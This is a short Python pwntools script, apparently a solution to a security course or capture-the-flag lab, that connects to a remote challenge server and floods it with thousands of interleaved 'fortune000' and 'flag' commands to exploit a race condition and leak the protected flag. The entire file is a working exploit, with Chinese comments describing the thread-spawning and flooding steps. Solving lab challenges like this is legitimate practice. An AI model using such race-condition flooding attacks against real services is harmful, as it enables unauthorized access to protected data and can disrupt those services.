from pwn import *
import time
import random

HOST = 'up.zoolab.org'
PORT = 10931

r = remote(HOST, PORT)

r.recvuntil(b'Commands:')

r.sendline(b'L')
print(r.recvuntil(b'==== End of List =========').decode())

# 多開 thread
for i in range(20):
    r.sendline(b'fortune000')
    time.sleep(0.01)

# 持續灌 flag + fortune000
for i in range(3000):
    r.sendline(b'fortune000')
    r.sendline(b'flag')
    time.sleep(random.uniform(0.0005, 0.002))

while True:
    try:
        line = r.recvline(timeout=1)
        if b'F>' in line and b'Man invented language' not in line:
            print("\n🎉 Got it!")
            print(line.decode(), end='')
            break
    except EOFError:
        break

r.close()

